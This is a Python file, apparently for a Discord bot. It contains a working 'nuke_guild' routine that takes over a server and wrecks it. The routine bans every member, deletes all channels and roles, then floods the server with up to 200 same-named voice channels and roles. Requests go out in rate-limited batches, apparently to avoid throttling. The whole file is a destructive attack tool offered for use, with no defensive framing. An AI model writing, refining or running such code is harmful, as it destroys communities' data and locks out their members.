import asyncio

async def process_in_batches(actions, batch_size=5, delay=5):
    for i in range(0, len(actions), batch_size):
        batch = actions[i:i + batch_size]
        await asyncio.gather(*batch)
        if i + batch_size < len(actions):
            await asyncio.sleep(delay)

async def nuke_guild(guild, name):
    print(f"Starting nuke on: {guild.name}")

    # Ban members
    ban_tasks = [member.ban(reason="Nuke") for member in guild.members if member != guild.me]
    banned = 0
    for i in range(0, len(ban_tasks), 5):
        batch = ban_tasks[i:i + 5]
        results = await asyncio.gather(*batch, return_exceptions=True)
        banned += sum(1 for r in results if not isinstance(r, Exception))
        if i + 5 < len(ban_tasks):
            await asyncio.sleep(5)
    print(f"Banned: {banned}")

    # Delete channels
    delete_channel_tasks = [channel.delete() for channel in guild.channels]
    deleted_channels = 0
    for i in range(0, len(delete_channel_tasks), 5):
        batch = delete_channel_tasks[i:i + 5]
        results = await asyncio.gather(*batch, return_exceptions=True)
        deleted_channels += sum(1 for r in results if not isinstance(r, Exception))
        if i + 5 < len(delete_channel_tasks):
            await asyncio.sleep(5)
    print(f"Deleted Channels: {deleted_channels}")

    # Delete roles
    delete_role_tasks = [role.delete() for role in guild.roles if role.name != "@everyone"]
    deleted_roles = 0
    for i in range(0, len(delete_role_tasks), 5):
        batch = delete_role_tasks[i:i + 5]
        results = await asyncio.gather(*batch, return_exceptions=True)
        deleted_roles += sum(1 for r in results if not isinstance(r, Exception))
        if i + 5 < len(delete_role_tasks):
            await asyncio.sleep(5)
    print(f"Deleted Roles: {deleted_roles}")

    # Create voice channels
    create_channel_tasks = [guild.create_voice_channel(name=name) for _ in range(200 - len(guild.channels))]
    created_channels = 0
    for i in range(0, len(create_channel_tasks), 5):
        batch = create_channel_tasks[i:i + 5]
        results = await asyncio.gather(*batch, return_exceptions=True)
        created_channels += sum(1 for r in results if not isinstance(r, Exception))
        if i + 5 < len(create_channel_tasks):
            await asyncio.sleep(5)
    print(f"Created Voice Channels: {created_channels}")

    # Create roles
    create_role_tasks = [guild.create_role(name=name) for _ in range(200 - len(guild.roles))]
    created_roles = 0
    for i in range(0, len(create_role_tasks), 5):
        batch = create_role_tasks[i:i + 5]
        results = await asyncio.gather(*batch, return_exceptions=True)
        created_roles += sum(1 for r in results if not isinstance(r, Exception))
        if i + 5 < len(create_role_tasks):
            await asyncio.sleep(5)
    print(f"Created Roles: {created_roles}")

    print("Nuke complete.")
